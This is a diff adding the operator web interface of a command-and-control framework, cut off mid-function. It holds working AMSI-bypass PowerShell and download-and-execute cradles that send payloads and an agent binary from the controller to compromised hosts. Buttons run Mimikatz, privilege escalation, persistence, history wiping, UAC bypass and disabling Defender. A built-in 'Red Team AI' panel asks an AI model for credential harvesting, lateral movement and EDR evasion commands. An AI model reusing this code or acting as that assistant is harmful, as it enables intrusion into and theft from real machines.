+            'download_b': 'DOWNLOAD_BYPASS',
+            'download_agent': 'DOWNLOAD_AGENT'
+        };
+        
+        function getInjectionCmd(type) {
+            const baseUrl = c2Config.tunnel_url || window.location.origin;
+            const key = c2Config.token || '';
+            
+            // AMSI bypass prefix - SIMPLE & RELIABLE - runs in SAME process before payload
+            const amsi = `$a='si';$b='Am';$c='Utils';$t=[Ref].Assembly.GetType('System.Management.Automation.'+$b+$a+$c);$t.GetField($b.ToLower()+$a+'InitFailed','NonPublic,Static').SetValue($null,$true);`;
+            
+            switch(type) {
+                case 'inject_simple':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/inject.ps1?key=${key}'))`;
+                case 'inject_i5':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/i5.ps1?key=${key}'))`;
+                case 'inject_syscall':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/i5_syscall.ps1?key=${key}'))`;
+                case 'inject_remote':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/i5_syscall_remote.ps1?key=${key}'))`;
+                case 'inject_fresh':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/syscall_fresh.ps1?key=${key}'))`;
+                case 'inject_arm64':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/i5_arm64.ps1?key=${key}'))`;
+                case 'download_b':
+                    return `${amsi}IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/b.ps1?key=${key}'))`;
+                case 'download_agent':
+                    return `IEX((New-Object Net.WebClient).DownloadString('${baseUrl}/payloads/rust_agent.exe?key=${key}'))`;
+                default:
+                    return quickCommands[type] || type;
+            }
+        }
+        
+        function quickSend(cmdKey) {
+            if (!selectedAgent || !ws || ws.readyState !== WebSocket.OPEN) {
+                addOutput('[!] Select an agent first!', 'error');
+                return;
+            }
+            
+            let cmd;
+            if (['inject_simple', 'inject_i5', 'inject_syscall', 'inject_remote', 'inject_fresh', 'inject_arm64', 'download_b', 'download_agent'].includes(cmdKey)) {
+                cmd = getInjectionCmd(cmdKey);
+            } else {
+                cmd = quickCommands[cmdKey];
+            }
+            
+            if (!cmd) {
+                addOutput('[!] Unknown command', 'error');
+                return;
+            }
+            
+            // CMD NATIVE commands - run directly (no PowerShell wrapper)
+            const cmdNative = ['whoami', 'sysinfo', 'hostname', 'ipconfig', 'netstat', 'tasklist', 
+                               'persist_check', 'persist_remove', 'clean_temp'];
+            
+            // PowerShell commands need wrapping for BITS CMD shell
+            if (!cmdNative.includes(cmdKey)) {
+                // Escape inner double quotes and wrap in cmd /C powershell
+                const escapedCmd = cmd.replace(/"/g, '\\"');
+                cmd = `cmd /C powershell -ep bypass -c "${escapedCmd}"`;
+            }
+            
+            ws.send(JSON.stringify({ type: 'command', agent_id: selectedAgent, command: cmd }));
+            addOutput(`$ ${cmd.length > 100 ? cmd.substring(0,100) + '...' : cmd}`, 'cmd');
+        }
+        
+        // Load config on page load
+        loadC2Config();
+        
+        connect();
+        
+        // More aggressive ping - every 10 seconds to prevent timeout
+        setInterval(() => { 
+            if (ws?.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() })); 
+            }
+        }, 10000);
+        
+        // Handle visibility change - reconnect when tab becomes visible again
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                // Tab became visible - check connection
+                if (!ws || ws.readyState !== WebSocket.OPEN) {
+                    console.log('[visibility] Tab visible, reconnecting...');
+                    addOutput('[*] Tab refocused - checking connection...', 'info');
+                    connect();
+                } else {
+                    // Send immediate ping to verify connection
+                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
+                }
+            }
+        });
+        
+        // Auto-refresh agents every 5 seconds
+        setInterval(() => {
+            if (ws?.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'get_agents' }));
+            }
+            updateAgents(); // Update stale status
+        }, 5000);
+    </script>
+    
+    <!-- PTY Modal with AI Split View -->
+    <div id="ptyModal" class="pty-modal">
+        <div class="pty-header">
+            <span>🖥️ INTERACTIVE PTY - <span id="ptyTarget">-</span></span>
+            <span class="status" id="ptyStatus">Connecting...</span>
+            <div style="display: flex; gap: 5px;">
+                <button class="pty-close" style="background:#0088aa" onclick="togglePtyAI()">🤖 AI</button>
+                <button class="pty-close" style="background:#666" onclick="closePtyTerminal()">⬇ HIDE</button>
+                <button class="pty-close" onclick="disconnectPtyTerminal()">✕ DISCONNECT</button>
+            </div>
+        </div>
+        <div class="pty-recon-tabs" style="flex-wrap: wrap;">
+            <button onclick="ptyExec('amsi')" title="AMSI Bypass">🛡️ AMSI</button>
+            <button onclick="ptyExec('privesc')" title="Run PrivEsc Enum" style="background:#b35900;">🔓 PrivEsc</button>
+            <button onclick="ptyExec('powerup')" title="Load PowerUp">⚡ PowerUp</button><button onclick="ptyExec('allchecks')" title="Invoke-AllChecks" style="background:#262;">✅ AllChecks</button>
+            <button onclick="ptyExec('powerview')" title="PowerView AD Recon" style="background:#226;">👁️ PowerView</button>
+            <button onclick="ptyExec('mimikatz')" title="Invoke-Mimikatz" style="background:#622;">🔐 Mimikatz</button>
+            <button onclick="ptyExec('whoami')" title="Current User">👤 whoami</button>
+            <button onclick="ptyExec('privs')" title="Privileges">🔑 privs</button>
+            <button onclick="ptyExec('sysinfo')" title="System Info">💻 sysinfo</button>
+            <button onclick="ptyExec('network')" title="Network Info">🌐 network</button>
+            <button onclick="ptyExec('processes')" title="Processes">📋 ps</button>
+            <button onclick="ptyExec('services')" title="Services">⚙️ services</button>
+            <button onclick="ptyExec('creds')" title="Stored Credentials">🗝️ creds</button>
+            <button onclick="ptyExec('gpp')" title="GPP Passwords" style="background:#262;">📁 GPP Pass</button>
+            <button onclick="ptyExec('cleanhist')" title="Clear PS History" style="background:#800;">🗑️ ClrHist</button>
+            <button onclick="ptyExec('addpersist')" title="Add Startup Persistence" style="background:#060;">📌 +Persist</button>
+            <button onclick="ptyExec('getdll')" title="Download DLL to TEMP" style="background:#035;">📥 GetDLL</button>
+            <button onclick="ptyExec('uacbypass')" title="Show UAC Bypass commands" style="background:#530;">🚀 UAC</button>
+            <button onclick="ptyExec('defender')" class="danger" title="Disable Defender">🔴 Defender OFF</button>
+            <button onclick="if(ptyWs&&ptyWs.readyState===1)ptyWs.send('\x0c')" title="Ctrl+L Clear Screen">🧹 Clear</button>
+            <button onclick="analyzeCurrentOutput()" style="background:#0088aa;" title="Send current output to AI">🤖 Analyze</button>
+        </div>
+        
+        <!-- Split View Container -->
+        <div class="pty-content">
+            <!-- Terminal Area -->
+            <div class="pty-terminal-area">
+                <div class="pty-terminal">
+                    <div id="ptyTerm"></div>
+                </div>
+            </div>
+            
+            <!-- AI Panel (Right Side) -->
+            <div id="ptyAIPanel" class="ai-panel">
+                <div class="ai-header">
+                    <span>🤖 RED TEAM AI</span>
+                    <span class="ai-model" id="aiModelBadge">Claude</span>
+                </div>
+                <div class="ai-actions">
+                    <button onclick="aiQuickAction('analyze')">📊 Analyze Output</button>
+                    <button onclick="aiQuickAction('privesc')">🔓 Privesc Tips</button>
+                    <button onclick="aiQuickAction('persist')">📌 Persistence</button>
+                    <button onclick="aiQuickAction('lateral')">🔀 Lateral Move</button>
+                    <button onclick="aiQuickAction('creds')">🔑 Cred Harvest</button>
+                    <button onclick="clearAIChat()">🗑️ Clear</button>
+                </div>
+                <div class="ai-chat" id="aiChat">
+                    <div class="ai-message system">🤖 AI Red Team Assistant ready. I can see your terminal output and help with exploitation.</div>
+                </div>
+                <div class="ai-input-area">
+                    <textarea id="aiInput" rows="2" placeholder="Ask the AI about your target..."></textarea>
+                    <button class="ai-btn" onclick="sendAIMessage()">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+    // ═══════════════════════════════════════════════════════════
+    // AI ASSISTANT INTEGRATION (GLOBAL FOR BITS PAGE)
+    // ═══════════════════════════════════════════════════════════
+    
+    let ptyOutputBuffer = [];  // Store terminal output for AI context
+    let bitsOutputBuffer = []; // Store BITS output for AI context
+    const MAX_OUTPUT_BUFFER = 50000;  // Max chars to keep
+    let aiAvailable = false;
+    
+    // Check AI status on load
+    async function checkAIStatus() {
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/status', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                aiAvailable = data.available;
+                if (data.model) {
+                    const modelName = data.model.replace('claude-', '').substring(0, 12);
+                    const aiModelBadge = document.getElementById('aiModelBadge');
+                    const bitsAiModelBadge = document.getElementById('bitsAiModelBadge');
+                    if (aiModelBadge) aiModelBadge.textContent = modelName;
+                    if (bitsAiModelBadge) bitsAiModelBadge.textContent = modelName;
+                }
+            }
+        } catch (e) {
+            console.warn('AI status check failed:', e);
+        }
+    }
+    checkAIStatus();
+    
+    function togglePtyAI() {
+        const panel = document.getElementById('ptyAIPanel');
+        if (panel) panel.classList.toggle('collapsed');
+        // Re-fit terminal when panel toggles
+        setTimeout(() => {
+            if (ptyFitAddon) ptyFitAddon.fit();
+        }, 300);
+    }
+    
+    function toggleAIPanel() {
+        // Toggle main BITS AI panel (in main view)
+        const bitsPanel = document.getElementById('bitsAIPanel');
+        if (bitsPanel) {
+            bitsPanel.classList.toggle('collapsed');
+        }
+        // Also toggle PTY AI panel if PTY modal is open
+        const modal = document.getElementById('ptyModal');
+        if (modal && modal.classList.contains('active')) {
+            const ptyPanel = document.getElementById('ptyAIPanel');
+            if (ptyPanel) ptyPanel.classList.toggle('collapsed');
+        }
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    // BITS MAIN VIEW AI FUNCTIONS
+    // ═══════════════════════════════════════════════════════════
+    
+    function captureBitsOutput(text) {
+        if (!text) return;
+        bitsOutputBuffer.push(text);
+        const totalLen = bitsOutputBuffer.join('').length;
+        if (totalLen > MAX_OUTPUT_BUFFER) {
+            while (bitsOutputBuffer.join('').length > MAX_OUTPUT_BUFFER * 0.8) {
+                bitsOutputBuffer.shift();
+            }
+        }
+    }
+    
+    function addBitsAIMessage(content, role = 'assistant') {
+        const chat = document.getElementById('bitsAIChat');
+        if (!chat) return;
+        const msg = document.createElement('div');
+        msg.className = `ai-message ${role}`;
+        let html = content
+            .replace(/```([\s\S]*?)```/g, '<pre>$1</pre>')
+            .replace(/`([^`]+)`/g, '<code>$1</code>')
+            .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+            .replace(/🔴/g, '<span style="color:#ff4444">🔴</span>')
+            .replace(/✅/g, '<span style="color:#00ff00">✅</span>')
+            .replace(/\n/g, '<br>');
+        msg.innerHTML = html;
+        chat.appendChild(msg);
+        chat.scrollTop = chat.scrollHeight;
+    }
+    
+    function showBitsAILoading(show) {
+        const chat = document.getElementById('bitsAIChat');
+        if (!chat) return;
+        let loader = document.getElementById('bitsAILoader');
+        if (show && !loader) {
+            loader = document.createElement('div');
+            loader.id = 'bitsAILoader';
+            loader.className = 'ai-loading';
+            loader.innerHTML = '<div class="spinner"></div> AI is thinking...';
+            chat.appendChild(loader);
+            chat.scrollTop = chat.scrollHeight;
+        } else if (!show && loader) {
+            loader.remove();
+        }
+    }
+    
+    function clearBitsAIChat() {
+        const chat = document.getElementById('bitsAIChat');
+        if (chat) {
+            chat.innerHTML = '<div class="ai-message system">🤖 Chat cleared. AI Red Team Assistant ready.</div>';
+        }
+    }
+    
+    async function sendBitsAIMessage() {
+        const input = document.getElementById('bitsAIInput');
+        if (!input) return;
+        const message = input.value.trim();
+        if (!message) return;
+        
+        addBitsAIMessage(message, 'user');
+        input.value = '';
+        
+        // Get output from main view
+        const outputDiv = document.getElementById('output');
+        let recentOutput = outputDiv ? outputDiv.innerText.slice(-10000) : '';
+        recentOutput += '\n' + bitsOutputBuffer.slice(-5000).join('');
+        
+        showBitsAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: message,
+                    context: recentOutput ? `BITS Agent: ${selectedAgent || 'unknown'}\nRecent output:\n${recentOutput}` : '',
+                    mode: 'chat'
+                })
+            });
+            
+            showBitsAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addBitsAIMessage(data.analysis, 'assistant');
+                } else {
+                    addBitsAIMessage(`❌ ${data.error}`, 'system');
+                }
+            } else {
+                addBitsAIMessage(`❌ API Error: ${resp.status}`, 'system');
+            }
+        } catch (e) {
+            showBitsAILoading(false);
+            addBitsAIMessage(`❌ ${e.message}`, 'system');
+        }
+    }
+    
+    async function analyzeBitsOutput() {
+        const outputDiv = document.getElementById('output');
+        let recentOutput = outputDiv ? outputDiv.innerText.slice(-15000) : '';
+        
+        if (!recentOutput.trim()) {
+            addBitsAIMessage('No output to analyze. Run some commands first!', 'system');
+            return;
+        }
+        
+        addBitsAIMessage('📊 Analyzing BITS output...', 'user');
+        showBitsAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: recentOutput,
+                    context: `BITS Agent: ${selectedAgent || 'unknown'}`,
+                    mode: 'analyze'
+                })
+            });
+            
+            showBitsAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addBitsAIMessage(data.analysis, 'assistant');
+                } else {
+                    addBitsAIMessage(`❌ ${data.error}`, 'system');
+                }
+            }
+        } catch (e) {
+            showBitsAILoading(false);
+            addBitsAIMessage(`❌ ${e.message}`, 'system');
+        }
+    }
+    
+    async function aiQuickActionBits(action) {
+        const prompts = {
+            analyze: 'Analyze the current output and identify security findings.',
+            privesc: 'Based on the output, suggest specific privilege escalation techniques with commands.',
+            persist: 'Recommend persistence mechanisms for this target with commands.',
+            creds: 'What credential harvesting techniques should I try? Include commands.',
+            evasion: 'How can I evade detection? Suggest AV/EDR bypass techniques.'
+        };
+        
+        const prompt = prompts[action];
+        if (!prompt) return;
+        
+        addBitsAIMessage(prompt, 'user');
+        
+        const outputDiv = document.getElementById('output');
+        const recentOutput = outputDiv ? outputDiv.innerText.slice(-10000) : '';
+        
+        showBitsAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: `${prompt}\n\nContext:\n${recentOutput}`,
+                    mode: 'chat'
+                })
+            });
+            
+            showBitsAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addBitsAIMessage(data.analysis, 'assistant');
+                } else {
+                    addBitsAIMessage(`❌ ${data.error}`, 'system');
+                }
+            }
+        } catch (e) {
+            showBitsAILoading(false);
+            addBitsAIMessage(`❌ ${e.message}`, 'system');
+        }
+    }
+    
+    // Handle Enter key in BITS AI input
+    document.addEventListener('DOMContentLoaded', () => {
+        const bitsAIInput = document.getElementById('bitsAIInput');
+        if (bitsAIInput) {
+            bitsAIInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault();
+                    sendBitsAIMessage();
+                }
+            });
+        }
+    });
+    
+    // ═══════════════════════════════════════════════════════════
+    // PTY MODAL AI FUNCTIONS (existing)
+    // ═══════════════════════════════════════════════════════════
+    
+    function addAIMessage(content, role = 'assistant') {
+        const chat = document.getElementById('aiChat');
+        if (!chat) return;
+        const msg = document.createElement('div');
+        msg.className = `ai-message ${role}`;
+        
+        // Parse markdown-like formatting
+        let html = content
+            .replace(/```([\s\S]*?)```/g, '<pre>$1</pre>')
+            .replace(/`([^`]+)`/g, '<code>$1</code>')
+            .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+            .replace(/🔴/g, '<span style="color:#ff4444">🔴</span>')
+            .replace(/\n/g, '<br>');
+        
+        msg.innerHTML = html;
+        chat.appendChild(msg);
+        chat.scrollTop = chat.scrollHeight;
+    }
+    
+    function showAILoading(show) {
+        const chat = document.getElementById('aiChat');
+        let loader = document.getElementById('aiLoader');
+        
+        if (show && !loader) {
+            loader = document.createElement('div');
+            loader.id = 'aiLoader';
+            loader.className = 'ai-loading';
+            loader.innerHTML = '<div class="spinner"></div> AI is thinking...';
+            chat.appendChild(loader);
+            chat.scrollTop = chat.scrollHeight;
+        } else if (!show && loader) {
+            loader.remove();
+        }
+    }
+    
+    async function sendAIMessage() {
+        const input = document.getElementById('aiInput');
+        const message = input.value.trim();
+        if (!message) return;
+        
+        // Add user message
+        addAIMessage(message, 'user');
+        input.value = '';
+        
+        // Get recent terminal output for context
+        const recentOutput = ptyOutputBuffer.slice(-10000).join('');
+        
+        showAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: message,
+                    context: `Recent terminal output:\n${recentOutput}`,
+                    mode: 'chat'
+                })
+            });
+            
+            showAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addAIMessage(data.analysis, 'assistant');
+                } else {
+                    addAIMessage(`❌ Error: ${data.error}`, 'system');
+                }
+            } else {
+                addAIMessage(`❌ API Error: ${resp.status}`, 'system');
+            }
+        } catch (e) {
+            showAILoading(false);
+            addAIMessage(`❌ Network error: ${e.message}`, 'system');
+        }
+    }
+    
+    // Helper to get ALL available output (PTY + BITS)
+    function getAllOutput(maxChars = 15000) {
+        let output = '';
+        
+        // Get PTY terminal buffer
+        if (ptyOutputBuffer && ptyOutputBuffer.length > 0) {
+            output += ptyOutputBuffer.join('');
+        }
+        
+        // Get BITS main view output
+        const bitsOutputDiv = document.getElementById('output');
+        if (bitsOutputDiv && bitsOutputDiv.innerText) {
+            output += '\n--- BITS OUTPUT ---\n' + bitsOutputDiv.innerText;
+        }
+        
+        // Get BITS buffer too
+        if (bitsOutputBuffer && bitsOutputBuffer.length > 0) {
+            output += '\n' + bitsOutputBuffer.join('');
+        }
+        
+        return output.slice(-maxChars);
+    }
+    
+    async function analyzeCurrentOutput() {
+        const recentOutput = getAllOutput(15000);
+        
+        if (!recentOutput.trim()) {
+            addAIMessage('No output to analyze yet. Run some commands in BITS or PTY first!', 'system');
+            return;
+        }
+        
+        addAIMessage('📊 Analyzing all terminal output...', 'user');
+        showAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: recentOutput,
+                    context: `Agent: ${selectedAgent || 'unknown'}`,
+                    mode: 'analyze'
+                })
+            });
+            
+            showAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addAIMessage(data.analysis, 'assistant');
+                } else {
+                    addAIMessage(`❌ ${data.error}`, 'system');
+                }
+            } else {
+                const errData = await resp.json().catch(() => ({}));
+                addAIMessage(`❌ ${errData.error || `API Error ${resp.status}`}`, 'system');
+            }
+        } catch (e) {
+            showAILoading(false);
+            addAIMessage(`❌ ${e.message}`, 'system');
+        }
+    }
+    
+    async function aiQuickAction(action) {
+        const prompts = {
+            analyze: 'Analyze the current terminal output and identify any security findings, credentials, or opportunities.',
+            privesc: 'Based on the system information, suggest specific privilege escalation techniques that might work. Include exact commands.',
+            persist: 'Recommend persistence mechanisms suitable for this target. Consider the AV/EDR situation and suggest stealthy options with commands.',
+            lateral: 'Suggest lateral movement options based on the current access level and network position. Include specific techniques and commands.',
+            creds: 'What credential harvesting techniques should I try? Consider the current privileges and suggest specific commands.'
+        };
+        
+        const prompt = prompts[action];
+        if (!prompt) return;
+        
+        addAIMessage(prompt, 'user');
+        
+        const recentOutput = ptyOutputBuffer.slice(-10000).join('');
+        showAILoading(true);
+        
+        try {
+            const token = localStorage.getItem('c2_token') || localStorage.getItem('token');
+            const resp = await fetch('/api/ai/analyze', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${token}`
+                },
+                body: JSON.stringify({
+                    output: `${prompt}\n\nContext from terminal:\n${recentOutput}`,
+                    mode: 'chat'
+                })
+            });
+            
+            showAILoading(false);
+            
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data.success) {
+                    addAIMessage(data.analysis, 'assistant');
+                } else {
+                    addAIMessage(`❌ ${data.error}`, 'system');
+                }
+            }
+        } catch (e) {
+            showAILoading(false);
+            addAIMessage(`❌ ${e.message}`, 'system');
+        }
+    }
+    
+    function clearAIChat() {
+        const chat = document.getElementById('aiChat');
+        chat.innerHTML = '<div class="ai-message system">🤖 Chat cleared. AI Red Team Assistant ready.</div>';
+    }
+    
+    // Handle Enter key in AI input
+    document.addEventListener('DOMContentLoaded', () => {
+        const aiInput = document.getElementById('aiInput');
+        if (aiInput) {
+            aiInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault();
+                    sendAIMessage();
+                }
+            });
+        }
+    });
+    
+    // ═══════════════════════════════════════════════════════════
+    // INTERACTIVE PTY - Full TTY Terminal
+    // ═══════════════════════════════════════════════════════════
+    let ptyWs = null;
+    let ptyDataHandler = null;
+    let ptyTerm = null;
+    let ptyFitAddon = null;
+    let ptyKeepAlive = null;  // Keepalive interval reference
+    
+    function openPtyTerminal() {
+        if (!selectedAgent) {
+            addOutput("[!] Select an agent first!", "error");
+            return;
+        }
+        
+        const modal = document.getElementById("ptyModal");
+        const termContainer = document.getElementById("ptyTerm");
+        const statusEl = document.getElementById("ptyStatus");
+        const targetEl = document.getElementById("ptyTarget");
+        
+        targetEl.textContent = selectedAgent;
+        statusEl.textContent = "Connecting...";
+        modal.classList.add("active");
+        
+        // Reuse existing connection if open
+        if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+            if (ptyFitAddon) ptyFitAddon.fit();
+            return;
+        }
+        
+        // Initialize xterm
+        if (!ptyTerm) {
+            ptyTerm = new Terminal({
+                cursorBlink: true,
+                theme: {
+                    background: "#000000",
+                    foreground: "#00ff00",
+                    cursor: "#00ff00",
+                    cursorAccent: "#000000",
+                    black: "#000000",
+                    red: "#ff0000",
+                    green: "#00ff00",
+                    yellow: "#ffff00",
+                    blue: "#0080ff",
+                    magenta: "#ff00ff",
+                    cyan: "#00ffff",
+                    white: "#ffffff"
+                },
+                fontSize: 14,
+                fontFamily: "Consolas, monospace",
+                scrollback: 5000, convertEol: true
+            });
+            ptyFitAddon = new FitAddon.FitAddon();
+            ptyTerm.loadAddon(ptyFitAddon);
+            ptyTerm.open(termContainer);
+            ptyFitAddon.fit();
+        }
+        ptyTerm.clear();
+        ptyFitAddon.fit();
+        
+        // Connect WebSocket
+        const token = localStorage.getItem("c2_token") || localStorage.getItem("token");
+        const wsProtocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const wsUrl = wsProtocol + "//" + window.location.host + "/tty/" + encodeURIComponent(selectedAgent) + "?token=" + token;
+        
+        try {
+            ptyWs = new WebSocket(wsUrl);
+            
+            ptyWs.onopen = () => {
+                // Identify as operator
+                ptyWs.send(JSON.stringify({role: "operator", token: token}));
+                statusEl.textContent = "Waiting for agent...";
+
+            };
+            
+            ptyWs.onmessage = (e) => {
+                try {
+                    const data = JSON.parse(e.data);
+                    if (data.type === "connected") {
+                        statusEl.textContent = "Connected!";
+                        statusEl.style.color = "#0f0"; setTimeout(() => ptyTerm.clear(), 100);
+                        // Send Enter to get initial prompt
+                        
+                    } else if (data.type === "status") {
+                    } else if (data.type === "error") {
+                        ptyTerm.writeln("\x1b[31m[-] " + data.msg || data.message + "\x1b[0m");
+                        statusEl.textContent = "Error";
+                        statusEl.style.color = "#f00";
+                    } else if (data.type === "disconnected") {
+                        ptyTerm.writeln("\x1b[31m[-] " + data.msg || data.message + "\x1b[0m");
+                        statusEl.textContent = "Disconnected";
+                        statusEl.style.color = "#f00";
+                    }
+                } catch {
+                    // Raw PTY output - write to terminal AND capture for AI
+                    ptyTerm.write(e.data);
+                    
+                    // Capture output for AI context (strip ANSI codes)
+                    const cleanText = e.data.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '').replace(/\x1b\][^\x07]*\x07/g, '');
+                    ptyOutputBuffer.push(cleanText);
+                    
+                    // Trim buffer if too large
+                    const totalLen = ptyOutputBuffer.join('').length;
+                    if (totalLen > MAX_OUTPUT_BUFFER) {
+                        while (ptyOutputBuffer.length > 0 && ptyOutputBuffer.join('').length > MAX_OUTPUT_BUFFER * 0.8) {
+                            ptyOutputBuffer.shift();
+                        }
+                    }
+                }
+            };
+            
+            ptyWs.onerror = () => {
+                statusEl.textContent = "Connection Error";
+                statusEl.style.color = "#f00";
+                ptyTerm.writeln("\x1b[31m[-] WebSocket error\x1b[0m");
+            };
+            
+            ptyWs.onclose = () => {
+                statusEl.textContent = "Disconnected";
+                ptyTerm.writeln("\x1b[31m[-] Connection closed\x1b[0m");
+            };
+            
+            // Handle keyboard input - line-buffered with local echo
+            // Dispose old handler if exists
+            if (ptyDataHandler) {
+                ptyDataHandler.dispose();
+            }
+            
+            // Raw mode - send everything directly to ConPTY
+            ptyDataHandler = ptyTerm.onData(data => {
+                if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+                    ptyWs.send(data);
+                }
+            });
+
+            // Send initial resize after connection
+            setTimeout(() => {
+                if (ptyWs && ptyWs.readyState === WebSocket.OPEN && ptyTerm) {
+                    ptyFitAddon.fit();  // Re-fit first
+                    const dims = ptyFitAddon.proposeDimensions();
+                    if (dims) {
+                        console.log("Sending resize:", dims.cols, dims.rows);
+                        ptyWs.send(JSON.stringify({resize: [dims.cols, dims.rows]}));
+                    }
+                }
+            }, 500);
+            
+            // Send another resize after PTY is fully ready
+            setTimeout(() => {
+                if (ptyWs && ptyWs.readyState === WebSocket.OPEN && ptyTerm) {
+                    ptyFitAddon.fit();
+                    const dims = ptyFitAddon.proposeDimensions();
+                    if (dims) {
+                        ptyWs.send(JSON.stringify({resize: [dims.cols, dims.rows]}));
+                    }
+                }
+            }, 1500);
+
+        } catch (err) {
+            ptyTerm.writeln("\x1b[31m[-] Failed to connect: " + err + "\x1b[0m");
+        }
+        
+        // Resize handler - also send to agent
+        window.addEventListener("resize", () => {
+            if (ptyFitAddon) {
+                ptyFitAddon.fit();
+                if (ptyWs && ptyWs.readyState === WebSocket.OPEN && ptyTerm) {
+                    const dims = ptyFitAddon.proposeDimensions();
+                    if (dims) {
+                        ptyWs.send(JSON.stringify({resize: [dims.cols, dims.rows]}));
+                    }
+                }
+            }
+        });
+        
+        // PTY keepalive - send null byte every 15 seconds to prevent timeout
+        if (typeof ptyKeepAlive !== 'undefined') clearInterval(ptyKeepAlive);
+        ptyKeepAlive = setInterval(() => {
+            if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+                // Send empty JSON ping to keep connection alive
+                try {
+                    ptyWs.send(JSON.stringify({ping: Date.now()}));
+                } catch(e) {
+                    console.warn('[PTY keepalive] failed:', e);
+                }
+            }
+        }, 15000);
+    }
+    
+    
+    // Send recon command to PTY
+    function sendReconCmd(el) {
+        const cmd = el.getAttribute('data-cmd');
+        if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+            ptyWs.send(cmd + "\n");
+            ptyTerm.write("\r\n\x1b[33m> " + cmd.substring(0, 50) + (cmd.length > 50 ? "..." : "") + "\x1b[0m\r\n");
+        }
+    }
+    
+    // Load and execute PowerSploit script
+    function loadPowerSploit(script, cmd) {
+        const token = localStorage.getItem("token") || c2Config.token || localStorage.getItem("c2_token") || "";
+        const url = window.location.origin + "/payloads/PowerSploit/" + script + "?key=" + token;
+        const fullCmd = "IEX(New-Object Net.WebClient).DownloadString('" + url + "'); " + cmd;
+        if (ptyWs && ptyWs.readyState === WebSocket.OPEN) {
+            ptyWs.send(fullCmd + "\n");
+            ptyTerm.write("\r\n\x1b[35m> Loading " + script + "...\x1b[0m\r\n");
+        }
+    }
+
+    function closePtyTerminal() {
+        document.getElementById("ptyModal").classList.remove("active");
+        // Keep WebSocket alive - just hide modal
+    }
+    
+    function disconnectPtyTerminal() {
+        const modal = document.getElementById("ptyModal");
+        modal.classList.remove("active");
+        
+        if (ptyWs) {
+            ptyWs.close();
+            ptyWs = null;
+        }
+    }
+
+    // Recon tab commands
+    function getPtyReconCmds() {
+        const baseUrl = c2Config.tunnel_url || window.location.origin;
+        const key = c2Config.token || localStorage.getItem("c2_token") || localStorage.getItem("token") || "";
+        return {
+            amsi: ["$v1=[Ref].Assembly.GetType(\"System.Management.Automation.Amsi\"+\"Utils\")", "$v2=$v1.GetField(\"amsi\"+\"InitFailed\",\"NonPublic,Static\")", "$v2.SetValue($null,$true)"],
+            privesc: "$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(200,9999); IEX(IWR '" + baseUrl + "/payloads/CyberEnum.ps1?key=" + key + "' -UseBasicParsing)",
